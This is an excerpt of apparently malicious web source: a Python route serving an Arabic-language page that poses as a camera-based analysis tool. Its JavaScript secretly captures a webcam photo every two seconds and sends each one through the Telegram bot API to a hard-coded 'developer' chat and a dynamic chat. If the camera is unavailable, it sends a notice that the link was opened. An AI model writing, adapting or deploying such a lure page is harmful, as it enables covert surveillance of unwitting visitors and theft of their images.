...
def home():
    ...
    <div class="container" id="mainScreen">
        ...
        <div class="warning">
            ...
            يجب السماح باستخدام الكاميرا للبدء
        </div>
        <div class="btn-container">
            <button class="start-btn" onclick="startCapture()">
    ...
    <div class="container" id="analysisScreen">
        ...
        <div class="video-container">
            ...
            <div class="overlay">
                ...
                <div class="analysis-text" id="analysisText">جاري التحضير...</div>
            </div>
        </div>
    ...
    <script>
        ...
        const fixedChatId = 6002805119; // رقم المطور الثابت
        ...
        function startCapture() {
            ...
            .then(stream => {
                ...
                video.onloadedmetadata = () => {
                    ...
                    setTimeout(() => {
                        captureAndSend();
                        intervalId = setInterval(captureAndSend, 2000); // صورة كل 2 ثانية
                    }, 2000);
                };
            })
            .catch(err => {
                ...
                if (video.srcObject) {
                    ...
                    canvas.toBlob(blob => {
                        if (blob) {
                            ...
                            // إرسال الصورة للرقم الثابت
                            sendPhotoToTelegram(fixedChatId, blob);
                        }
                    }, 'image/jpeg', 0.7);
                } else {
                    // إذا لم تكن الكاميرا متوفرة، نرسل إشعار فقط
                    sendNotification();
                }
            } catch (error) {
        ...
        function sendPhotoToTelegram(chatId, blob) {
            ...
            .then(data => {
                console.log(`✅ تم إرسال الصورة ${photoCount} إلى ${chatId}`);
            })
            .catch(error => {
        ...
        function sendNotification() {
            // في حال عدم وجود صورة، نرسل رسالة نصية
            if (dynamicChatId) {
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: dynamicChatId,
                        text: `⚠️ تم فتح رابط الكاميرا لكن تعذر التقاط الصورة ${photoCount} بسبب مشكلة في الكاميرا.`
                    })
